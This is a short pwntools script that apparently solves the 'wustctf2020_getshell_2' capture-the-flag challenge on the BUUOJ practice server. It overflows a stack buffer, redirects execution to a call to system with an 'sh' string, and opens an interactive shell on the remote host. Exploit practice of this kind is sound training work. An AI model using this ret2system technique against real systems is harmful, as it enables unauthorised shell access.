from pwn import *


p = remote("node4.buuoj.cn", 29816)
pro = ELF("./wustctf2020_getshell_2")


# system = pro.plt["system"]
# use call_system, call instr will auto push ret addr
call_sys = 0x08048529
sh = next(pro.search(b"sh\x00"))
print(hex(sh))

pad = cyclic(0x18+0x4)
pad += p32(call_sys)+p32(sh)
p.send(pad)

p.interactive()


